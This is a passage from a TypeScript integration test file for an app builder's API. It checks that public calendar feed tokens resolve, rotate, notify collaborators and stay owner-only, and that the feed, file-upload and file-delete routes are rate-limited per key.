            { name: "customer", type: "relation", relationTo: "Customer", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    const customer = insertRecord(db, projectId, spec.entities[0], { fullName: "Yossi Cohen" });
    insertRecord(db, projectId, spec.entities[1], { name: "Checkup", date: "2026-05-01", customer: customer.id });

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    const { token: feedToken } = (await tokenRes.json()) as { token: string };

    const feedRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${feedToken}`);
    assert.equal(feedRes.status, 200);
    const ics = await feedRes.text();
    assert.match(ics, /DESCRIPTION:.*customer: Yossi Cohen/, "the relation field must resolve to the related Customer's own real name, not a raw foreign-key id");
  });
});

/**
 * Round 1160: mirrors the test above exactly, except the relation field's
 * own relationTo ("customer") differs from its real target entity's name
 * ("Customer") only by letter case -- the same genuinely plausible
 * AI-generated-spec scenario migrate.ts's own round-1159 fix addresses for
 * FK generation. Before this round, routes/calendar.ts's own relatedRecords
 * prefetch and calendarFeed.ts's own relationDisplayLabelLocal both did an
 * exact-case `e.name === field.relationTo` lookup, so this scenario would
 * have fallen all the way through to the raw "#<id>" fallback through the
 * real route, not just in a unit test on either file in isolation.
 */
test("GET /public/calendar/:projectId/:entityName.ics's DESCRIPTION still resolves a relation field whose relationTo differs from its target entity's name only by letter case", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-relation-case-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        { name: "Customer", fields: [{ name: "fullName", type: "text", required: true }] },
        {
          name: "Appointment",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "date", type: "date", required: true },
            { name: "customer", type: "relation", relationTo: "customer", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    const customer = insertRecord(db, projectId, spec.entities[0], { fullName: "Yossi Cohen" });
    insertRecord(db, projectId, spec.entities[1], { name: "Checkup", date: "2026-05-01", customer: customer.id });

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    const { token: feedToken } = (await tokenRes.json()) as { token: string };

    const feedRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${feedToken}`);
    assert.equal(feedRes.status, 200);
    const ics = await feedRes.text();
    assert.match(
      ics,
      /DESCRIPTION:.*customer: Yossi Cohen/,
      "the relation field must still resolve to the related Customer's own real name even though relationTo is lowercase customer, not Customer",
    );
  });
});

/**
 * Round 1185: this route's own entity lookup (`entity.name === entityName`,
 * entityName coming straight from the URL path a real calendar app
 * re-fetches on its own schedule forever, once subscribed) was still
 * exact-case -- unlike every other entity-name-from-URL resolution in
 * this file (see routes/projects.ts's own findEntity helper, and the
 * sibling test for GET .../entities/:entityName above), and unlike this
 * SAME route's own relation-target lookup fixed in round 1160. A live
 * refine that recases an entity's own name (e.g. "Appointment" ->
 * "appointment") is the exact cosmetic, non-destructive rename rounds
 * 988/1029/1068/1145 already established must survive everywhere else
 * (column widths, sort keys, filters, view mode) -- but this route is
 * the one feature producing a durable, EXTERNALLY cached artifact a user
 * has no way to resubscribe themselves: the instant the rename lands,
 * every already-subscribed calendar silently 404s forever, with no
 * signal (this router's own doc comment deliberately keeps every 404
 * branch indistinguishable) that it was a cosmetic rename, not real data
 * loss. Builds the spec with the entity already named differently-cased
 * than the URL this test requests, the same way the relation-case test
 * just above sets up its own mismatch, rather than simulating a live
 * refine transition the route itself has no way to observe anyway (it
 * reads project.spec_json fresh on every request).
 */
test("GET /public/calendar/:projectId/:entityName.ics still resolves the feed when the URL's own entityName differs from the entity's real name only by letter case", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-entity-case-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    insertRecord(db, projectId, spec.entities[0], { name: "Checkup", date: "2026-05-01" });

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    const { token: feedToken } = (await tokenRes.json()) as { token: string };

    // The subscribe URL a real calendar app had already cached was baked
    // with "Appointment" -- the entity's OLD casing from before a refine
    // recased it to "appointment" above.
    const feedRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${feedToken}`);
    assert.equal(feedRes.status, 200, "an already-subscribed calendar's cached URL must keep working after a cosmetic, case-only entity rename");
    const ics = await feedRes.text();
    assert.match(ics, /SUMMARY:.*Checkup/, "the feed must still contain the real entity's own records, not an empty/wrong feed");
  });
});

/**
 * Round 1012: before this round, once a token was handed out via the GET
 * route above, nothing could ever invalidate it -- a removed or demoted
 * collaborator (or anyone who'd been forwarded the URL) kept live,
 * unauthenticated read access to the feed forever. Confirms the new
 * owner-only regenerate route actually makes the OLD token stop working
 * against the real public feed route (not just that it returns a
 * different value), while a fresh subscribe URL built from the new token
 * keeps working.
 */
test("POST /projects/:id/calendar-feed-token/regenerate invalidates the old token so the public feed route stops accepting it, while the new one keeps working", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-regen-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    insertRecord(db, projectId, spec.entities[0], { name: "Checkup", date: "2026-05-01" });

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    const { token: oldToken } = (await tokenRes.json()) as { token: string };

    const oldFeedRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${oldToken}`);
    assert.equal(oldFeedRes.status, 200, "sanity check: the original token must actually work before regenerating");

    const regenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token/regenerate`, {
      method: "POST",
      headers: authHeaders(authToken),
    });
    assert.equal(regenRes.status, 200);
    const { token: newToken } = (await regenRes.json()) as { token: string };
    assert.ok(newToken && newToken.length >= 32, "expected a real, long random token");
    assert.notEqual(newToken, oldToken, "regenerating must actually produce a different token, not return the same one");

    const oldFeedAfterRegenRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${oldToken}`);
    assert.equal(oldFeedAfterRegenRes.status, 404, "the OLD token must stop working -- this is the whole point of regenerating");

    const newFeedRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${newToken}`);
    assert.equal(newFeedRes.status, 200, "the NEW token must work against the real feed route");
    const ics = await newFeedRes.text();
    assert.match(ics, /SUMMARY:Checkup/);

    // Repeated GETs of the plain (non-regenerating) token route must now
    // return the NEW token, not silently keep handing out the old one.
    const tokenResAfter = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    assert.equal((await tokenResAfter.json() as { token: string }).token, newToken);
  });
});

/**
 * Round 1313: this route's own effect invalidates the exact token a retry
 * would otherwise still expect -- a response lost in transit after the
 * server already rotated the token used to make a retry with no
 * idempotency protection rotate it AGAIN, silently discarding the first
 * rotation's own token (and re-sending every collaborator a second,
 * confusing "link was reset" email) before the caller ever even saw it.
 * Same shape as PATCH .../role's own round-1262 idempotency protection.
 */
test("POST .../calendar-feed-token/regenerate retried with the same idempotency key after the first attempt already succeeded replays the original token, instead of rotating it again", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-regen-idem-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Appointment", fields: [{ name: "name", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const headers = { ...authHeaders(authToken), "x-idempotency-key": "regen-token-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token/regenerate`, { method: "POST", headers });
    assert.equal(firstRes.status, 200);
    const { token: firstToken } = (await firstRes.json()) as { token: string };
    assert.ok(firstToken && firstToken.length >= 32, "sanity check: the first attempt must have genuinely rotated the token");

    const retryRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token/regenerate`, { method: "POST", headers });
    assert.equal(retryRes.status, 200);
    const { token: retryToken } = (await retryRes.json()) as { token: string };
    assert.equal(retryToken, firstToken, "a retried regenerate with the same idempotency key must replay the original token, not rotate it a second time");

    const tokenResAfter = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    assert.equal(
      (await tokenResAfter.json() as { token: string }).token,
      firstToken,
      "the project's own stored token must still be the first attempt's own token, proving the retry never actually rotated it again",
    );
  });
});

/**
 * Round 1247: the project-wide counterpart to the per-entity feed route --
 * a project with more than one entity carrying its own independent date
 * field (Appointment.date and Invoice.dueDate here) can now subscribe to
 * ONE combined feed instead of one per entity. Shares the exact same
 * token-auth as the per-entity route (confirmed by the 404 case below).
 */
test("GET /public/calendar/:projectId/all/feed.ics merges every date-bearing entity's records into one feed, and 404s for the same bad-token cases as the per-entity route", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-all-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        { name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] },
        { name: "Invoice", fields: [{ name: "name", type: "text", required: true }, { name: "dueDate", type: "date", required: true }] },
        { name: "Note", fields: [{ name: "name", type: "text", required: true }] },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    insertRecord(db, projectId, spec.entities[0], { name: "Checkup", date: "2026-05-01" });
    insertRecord(db, projectId, spec.entities[1], { name: "Invoice #1", dueDate: "2026-05-10" });
    insertRecord(db, projectId, spec.entities[2], { name: "irrelevant" });

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    const { token: feedToken } = (await tokenRes.json()) as { token: string };

    const feedRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/all/feed.ics?token=${feedToken}`);
    assert.equal(feedRes.status, 200);
    assert.match(feedRes.headers.get("content-type") ?? "", /text\/calendar/);
    const ics = await feedRes.text();
    assert.match(ics, /BEGIN:VCALENDAR/);
    assert.match(ics, /SUMMARY:\[Appointment\] Checkup/, "the Appointment record's SUMMARY must be prefixed with its own entity's label");
    assert.match(ics, /SUMMARY:\[Invoice\] Invoice #1/, "the Invoice record's SUMMARY must be prefixed with its own entity's label");
    assert.doesNotMatch(ics, /irrelevant/, "Note has no date field at all -- it must never contribute an event to the combined feed");

    const noTokenRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/all/feed.ics?token=anything`);
    assert.equal(noTokenRes.status, 404, "the combined feed route must share the exact same token-auth as the per-entity route");

    const wrongProjectRes = await fetch(`${baseUrl}/api/public/calendar/${randomUUID()}/all/feed.ics?token=${feedToken}`);
    assert.equal(wrongProjectRes.status, 404);
  });
});

/**
 * Round 1247: confirms the route-registration-order fix actually works --
 * an entity genuinely named "Appointment" must still be reachable through
 * its own per-entity URL even now that the combined-feed route is
 * registered first.
 *
 * Round 1250: the combined feed moved off the single-segment
 * `/all.ics` path (which round 1250 found collides, case-insensitively,
 * with any entity actually named "All") to the two-segment
 * `/all/feed.ics` path below, so this coexistence check now matters for
 * a different reason: proving the per-entity `:entityName.ics` route's
 * own single-segment pattern never matches the combined route's
 * two-segment one, in either direction. See the dedicated "All" entity
 * test right after this one for the actual collision-elimination proof.
 */
test("GET /public/calendar/:projectId/:entityName.ics still works for an ordinary entity after the new /all/feed.ics route was added", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-coexist-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    insertRecord(db, projectId, spec.entities[0], { name: "Checkup", date: "2026-05-01" });

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    const { token: feedToken } = (await tokenRes.json()) as { token: string };

    const feedRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${feedToken}`);
    assert.equal(feedRes.status, 200);
    const ics = await feedRes.text();
    assert.match(ics, /SUMMARY:Checkup/, "the per-entity route's own SUMMARY must have no [EntityLabel] prefix -- that's the combined feed's own behavior only");
  });
});

/**
 * Round 1250: the actual collision-elimination proof. Before this round's
 * fix, a project with a real entity literally named "All" (in any letter
 * case) had its own per-entity feed permanently, silently shadowed by the
 * project-wide combined-feed route, because Express's route matching is
 * case-insensitive by default and the combined route used to live at the
 * single-segment literal path `/all.ics` -- indistinguishable, to
 * Express's router, from `:entityName.ics` matching the literal entity
 * name "All" (or "all", or "ALL"). Moving the combined route to the
 * two-segment `/all/feed.ics` path means this project's own
 * `GET .../All.ics` can now only ever match the per-entity route, whose
 * own SUMMARY has no `[EntityLabel]` prefix -- the combined feed's own
 * distinguishing behavior -- proving the two routes are no longer
 * conflated.
 */
test("an entity literally named \"All\" still reaches its own per-entity feed, not the combined one, now that the combined feed lives at a different path", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-all-entity-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "All", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    insertRecord(db, projectId, spec.entities[0], { name: "Everything", date: "2026-05-01" });

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    const { token: feedToken } = (await tokenRes.json()) as { token: string };

    const feedRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/All.ics?token=${feedToken}`);
    assert.equal(feedRes.status, 200);
    const ics = await feedRes.text();
    assert.match(ics, /SUMMARY:Everything/, "must reach the per-entity route's own unprefixed SUMMARY, not the combined feed's [All] Everything");
    assert.doesNotMatch(ics, /\[All\]/, "the combined feed's own [EntityLabel] SUMMARY prefix must never appear here");
  });
});

test("POST /projects/:id/calendar-feed-token/regenerate is owner-only, with the same existence-hiding 404 every other owner-only action uses", async () => {
  await withServer(async (baseUrl, db) => {
    const ownerEmail = `calendar-feed-regen-owner-${randomUUID()}@example.com`;
    const ownerToken = await signup(baseUrl, ownerEmail);
    const collabEmail = `calendar-feed-regen-collab-${randomUUID()}@example.com`;
    const collabToken = await signup(baseUrl, collabEmail);
    const owner = findUserByEmail(db, ownerEmail)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "CRM", description: "test", spec });

    await fetch(`${baseUrl}/api/projects/${projectId}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: collabEmail }),
    });

    const asCollaborator = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token/regenerate`, {
      method: "POST",
      headers: authHeaders(collabToken),
    });
    assert.equal(asCollaborator.status, 404, "a non-owner collaborator must never be able to rotate the token out from under everyone else's subscription");

    const asOwner = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token/regenerate`, {
      method: "POST",
      headers: authHeaders(ownerToken),
    });
    assert.equal(asOwner.status, 200, "the real owner must still be able to regenerate it");
  });
});

/**
 * Round 1290: this route's own doc comment above had long acknowledged
 * ("with no warning to them") that rotating the token silently breaks
 * every OTHER collaborator's already-configured calendar subscription,
 * but never actually notified anyone -- the one remaining silent
 * collaborator-impacting action in this file, unlike invite (1253),
 * role change (1254), removal (1254), ownership transfer (1255), project
 * deletion (1256/1259), and self-leave (1277), which all already notify
 * the affected party. Confirms the real EmailSender.send call reaches
 * the OTHER collaborator (not the owner who triggered the rotation),
 * naming the real project.
 */
test("regenerating the calendar feed token sends a real notification to every OTHER collaborator, naming the project, when email is configured", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl, db) => {
      const ownerEmail = `calendar-feed-regen-notify-owner-${randomUUID()}@example.com`;
      const ownerToken = await signup(baseUrl, ownerEmail);
      const collabEmail = `calendar-feed-regen-notify-collab-${randomUUID()}@example.com`;
      await signup(baseUrl, collabEmail);
      const owner = findUserByEmail(db, ownerEmail)!;
      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [{ name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: owner.id, name: "Clinic Calendar", description: "test", spec });

      await fetch(`${baseUrl}/api/projects/${projectId}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmail }),
      });
      emailSender.sentTo.length = 0; // The invite itself (round 1253) also sends one -- only the regenerate send matters here.

      const res = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token/regenerate?lang=en`, {
        method: "POST",
        headers: authHeaders(ownerToken),
      });
      assert.equal(res.status, 200);

      assert.equal(emailSender.sentTo.length, 1, "exactly one notification must be sent");
      assert.equal(emailSender.sentTo[0].to, collabEmail, "the notification must go to the OTHER collaborator, not the owner who triggered the rotation");
      assert.match(emailSender.sentTo[0].text, /Clinic Calendar/, "the body must name the real project");
    },
    { emailSender },
  );
});

test("regenerating the calendar feed token itself still succeeds, with no notification attempted, when no email provider is configured", async () => {
  const emailSender = createFakeEmailSender({ configured: false });
  await withServer(
    async (baseUrl, db) => {
      const ownerEmail = `calendar-feed-regen-notify-unconfigured-${randomUUID()}@example.com`;
      const ownerToken = await signup(baseUrl, ownerEmail);
      const collabEmail = `calendar-feed-regen-notify-unconfigured-collab-${randomUUID()}@example.com`;
      await signup(baseUrl, collabEmail);
      const owner = findUserByEmail(db, ownerEmail)!;
      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [{ name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: owner.id, name: "Clinic Calendar", description: "test", spec });

      await fetch(`${baseUrl}/api/projects/${projectId}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmail }),
      });

      const res = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token/regenerate`, {
        method: "POST",
        headers: authHeaders(ownerToken),
      });
      assert.equal(res.status, 200, "the rotation itself must still succeed with no email provider configured");
      assert.equal(emailSender.sentTo.length, 0, "no send should even be attempted when email isn't configured");
    },
    { emailSender },
  );
});

/**
 * Round 1070: unlike every route expensiveReadRateLimiter covers (round
 * 1053), this public feed route has no req.userId to throttle against at
 * all -- anyone who was ever handed the subscribe URL can hit it directly,
 * no login required. Confirms the 31st call against the SAME project+token
 * within the window is rejected with 429, while a different project's own
 * feed (a different key) is unaffected -- proves this is keyed per
 * project+token, not a single global counter that would collaterally
 * throttle every other subscriber's feed too.
 */
test("GET /public/calendar/:projectId/:entityName.ics is rate-limited per project+token: the 31st call is rejected with 429, while a different project's own feed is unaffected", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-rate-limit-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(token) });
    const { token: feedToken } = (await tokenRes.json()) as { token: string };

    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${feedToken}`);
      assert.notEqual(res.status, 429, `call ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
    }

    const blocked = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${feedToken}`);
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A different project's own feed must get its own fresh allowance --
    // keyed by project+token, not a single shared counter, so one
    // exhausted subscription can never collaterally block an unrelated
    // project's own subscribers.
    const otherProjectId = randomUUID();
    insertProject(db, { id: otherProjectId, ownerId: user.id, name: "CRM 2", description: "test", spec });
    diffAndMigrate(db, otherProjectId, undefined, spec);
    markProjectBuilt(db, otherProjectId);
    const otherTokenRes = await fetch(`${baseUrl}/api/projects/${otherProjectId}/calendar-feed-token`, { headers: authHeaders(token) });
    const { token: otherFeedToken } = (await otherTokenRes.json()) as { token: string };
    const otherRes = await fetch(`${baseUrl}/api/public/calendar/${otherProjectId}/Appointment.ics?token=${otherFeedToken}`);
    assert.equal(otherRes.status, 200, "a different project's own feed must not be collaterally blocked by another project's exhausted rate limit");
  });
});

/**
 * Regression test for a real bug found by round 1082's Explore survey:
 * unlike its structurally identical sibling, POST .../whatsapp/attachments/upload
 * (round 973's own doc comment: "Mirrors its idempotency/multer/error-handling
 * shape exactly" -- already behind whatsappRateLimiter), this route had NO
 * volumetric throttle at all. createUploadMiddleware's own 10MB-per-file cap
 * only bounds a single request's own size, never how many requests one
 * account can fire -- any authenticated collaborator with write access to
 * even one free project could script an unbounded loop of uploads, filling
 * the shared ephemeral disk this single-process deployment gives every
 * project (an uploaded-but-never-attached file just sits on disk forever,
 * per round 1002's own comment, with no cleanup short of deleting the whole
 * project). Confirms the new limiter, mirroring every sibling rate-limit
 * test's own shape above: the 31st call is rejected with 429, while a
 * different account is unaffected.
 */
test("POST .../fields/:fieldName/upload is rate-limited per authenticated account: the 31st upload is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `file-upload-rate-limit-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Customer",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "receipt", type: "file", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    for (let i = 0; i < 30; i++) {
      const formData = new FormData();
      formData.append("file", new File([`%PDF-fake-receipt-${i}`], `receipt-${i}.pdf`, { type: "application/pdf" }));
      const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/fields/receipt/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      });
      assert.notEqual(res.status, 429, `upload ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
    }

    const blockedFormData = new FormData();
    blockedFormData.append("file", new File(["%PDF-fake-receipt-30"], "receipt-30.pdf", { type: "application/pdf" }));
    const blocked = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/fields/receipt/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: blockedFormData,
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account's own uploads.
    const otherEmail = `file-upload-rate-limit-other-${randomUUID()}@example.com`;
    const otherToken = await signup(baseUrl, otherEmail);
    const otherUser = findUserByEmail(db, otherEmail)!;
    const otherProjectId = randomUUID();
    insertProject(db, { id: otherProjectId, ownerId: otherUser.id, name: "CRM 2", description: "test", spec });
    diffAndMigrate(db, otherProjectId, undefined, spec);
    markProjectBuilt(db, otherProjectId);

    const otherFormData = new FormData();
    otherFormData.append("file", new File(["%PDF-fake-receipt-other"], "receipt-other.pdf", { type: "application/pdf" }));
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProjectId}/entities/Customer/fields/receipt/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${otherToken}` },
      body: otherFormData,
    });
    assert.equal(otherRes.status, 200, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Regression test for a real bug found by round 1169's Explore survey:
 * DELETE .../fields/:fieldName/upload (round 1002's own cleanup route for
 * an abandoned/replaced create-form upload) shared the exact same path as
 * the POST route above, yet was registered with no rate limiter at all --
 * unlike its structurally identical sibling, DELETE .../whatsapp/attachments
 * (already behind whatsappRateLimiter, the same as its own POST sibling).
 * deleteUploadedFile (uploadPaths.ts) is a silent, best-effort no-op for
 * any url that doesn't resolve to a real upload, so this route itself
 * never required a genuine file on disk to hammer -- any authenticated
 * collaborator could script an unbounded loop of DELETE calls against any
 * project they can write to. Now wired to the SAME fileUploadRateLimiter
 * instance as the POST route (both verbs on this one path share a single
 * combined 30-per-15-min budget, exactly as whatsappRateLimiter already
 * does for its own POST/DELETE sibling pair), so this test spends the
 * shared budget via DELETE alone and confirms the 31st call is rejected.
 */
test("DELETE .../fields/:fieldName/upload is rate-limited per authenticated account, sharing its POST sibling's own budget: the 31st delete is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `file-delete-rate-limit-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Customer",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "receipt", type: "file", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/fields/receipt/upload`, {
        method: "DELETE",
        headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
        body: JSON.stringify({ url: `/uploads/${projectId}/Customer/does-not-exist-${i}.pdf` }),
      });
      assert.notEqual(res.status, 429, `delete ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
    }

    const blocked = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/fields/receipt/upload`, {
      method: "DELETE",
      headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
      body: JSON.stringify({ url: `/uploads/${projectId}/Customer/does-not-exist-30.pdf` }),
    });
